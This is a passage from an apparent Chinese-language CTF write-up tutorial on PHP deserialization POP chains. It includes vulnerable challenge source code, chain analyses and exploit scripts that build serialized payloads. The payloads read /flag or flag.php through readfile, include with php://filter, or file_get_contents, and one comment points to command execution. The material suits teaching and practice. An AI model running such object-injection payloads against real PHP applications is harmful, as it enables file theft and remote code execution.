class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>) // 正确的<span class="title">end</span>函数</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log); <span class="comment">//handle-&gt;log不可访问，触发__unset</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>) //在不可访问的属性上使用<span class="title">unset</span>(<span class="params"></span>)时触发</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>); <span class="comment">//可以构造执行系统命令,比如:system(ls /)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]); </span><br></pre></td></tr></table></figure></div><p>由此可以构造出 POP 链子</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Begin::__destruct -&gt; Then::toString -&gt; Super::__invoke -&gt; Handle::__call -&gt; CTF::end -&gt; WhiteGod::__unset</span><br></pre></td></tr></table></figure></div><p>由于链子调用中成员属性有 private 和 protected，用 construct 方法去调用链子，最后再使用 url 编码绕过</p><p>exp</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$a</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func= <span class="variable">$a</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;    </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="variable">$a</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;    </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="variable">$a</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = <span class="variable">$a</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="variable">$a</span>;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">var</span> = <span class="variable">$b</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Begin</span>(<span class="keyword">new</span> <span class="title class_">Then</span>(<span class="keyword">new</span> <span class="title class_">Super</span>(<span class="keyword">new</span> <span class="title class_">Handle</span>(<span class="keyword">new</span> <span class="title function_ invoke__">CTF</span>(<span class="keyword">new</span> <span class="title class_">WhiteGod</span>(<span class="string">&quot;readfile&quot;</span>,<span class="string">&quot;/flag&quot;</span>))))));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></div><p>稍微总结一下，POP 链的头一般是 GET/POST 传参引发 <code>__wakeup</code>  ,  <code>__construct</code>  ,  <code>__destruct</code></p><p>结尾一般是输出敏感信息或者执行系统命令所在函数，即 GetFlag 的点</p><h5 id="mrctf2020ezpop1"><a class="markdownIt-Anchor" href="#mrctf2020ezpop1">#</a> [MRCTF2020]Ezpop1</h5><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div><p>先找出可以 getflag 的点，在 <code>Modifier</code>  类中 <code>append</code>  函数有 <code>include</code>  函数可以文件包含，可以利用， <code>__invoke</code>  函数直接调用了 <code>append</code> ，在 Testlei 中 <code>__get</code>  将 p 作为函数调用，会触发 <code>__invoke</code> , 在 <code>__totring</code>  方法中 <code>$this-&gt;str</code>  赋予 <code>test</code>  类，在 <code>test</code>  类读取 <code>source</code>  变量，（因为 <code>test</code>  类中没有 <code>source</code>  属性，则是访问了不可访问的属性）则会自动调用 <code>__get</code>  魔术方法， <code>__wakeup</code>  函数将对象进行正则匹配，会触发 <code>__toString</code> ，而 <code>__wakeup</code>  在反序列化时会调用，可以当作 pop 链头，而尾时 <code>include</code>  函数，可以利用 <code>var</code>  构造 php 为协议获取 flag</p><p>pop 链：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Show:__wakeup -&gt; Show:__toString -&gt; Test:__get -&gt; Modifier:__invoke -&gt;Modifier: append</span><br></pre></td></tr></table></figure></div><p>exp:</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$var</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>; <span class="comment">//构造php为协议获取flag</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;source=<span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125; <span class="comment">//1.将用到的类写出形成框架并表明类的属性（变量）</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>(); <span class="comment">//将用到的类实例化，用到几次实例化几次</span></span><br><span class="line"><span class="variable">$a</span>-&gt;source=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;str=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;p= <span class="variable">$d</span>;    <span class="comment">//根据pop链将对象串联起来</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));  <span class="comment">//序列化头并url编码（在这个题中有protected修饰的属性，会有不可见字符）</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="2021-强网杯-赌徒"><a class="markdownIt-Anchor" href="#2021-强网杯-赌徒">#</a> 2021 强网杯 赌徒</h5><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//hint is in hint.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I think you need /etc/hint . Before this you need to see the source code&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_sayhello</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$cc</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give you flag : &quot;</span>.<span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="string">&#x27;ffiilleennaammee&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_hint</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$hint</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Get_hint</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$hi</span> = <span class="keyword">new</span>  <span class="title class_">Start</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>尾部可以看到 <code>Room</code>  类中有个 <code>Get_hint()</code>  方法，里面有一个 <code>file_get_contents</code> ，可以实现任意文件读取，我们就可以利用这个读取 flag 文件了，然后就是往前倒推， <code>Room</code>  类中 <code>__invoke()</code>  方法调用了 <code>Get_hint()</code> ，然后 <code>Room</code>  类的 <code>__get()</code>  里面有个 <code>return $function()</code>  可以调用 <code>__invoke()</code> ，再往前看， <code>Info</code>  类中的 <code>__toString()</code>  中有 <code>Room</code>  类中不存在的属性，所以可以调用 <code>__get()</code> ，然后 <code>Start</code>  类中有个 <code>_sayhello()</code>  可以调用 <code>__toString()</code> ，然后在 <code>Start</code>  类中 <code>__wakeup()</code>  方法中直接调用了 <code>_sayhello()</code> ，而我们知道的是，输入字符串之后就会先进入 <code>__wakeup()</code></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">头 -&gt; Start::__wakeup() -&gt; Start::_sayhello() -&gt; Info::__toString() -&gt; Room::__get() -&gt; Room::invoke() -&gt; Room::Get_hint() </span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Info</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Room</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Room</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; name = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; file[<span class="string">&#x27;filename&#x27;</span>] = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span> -&gt; a = <span class="variable">$d</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>在构建 pop 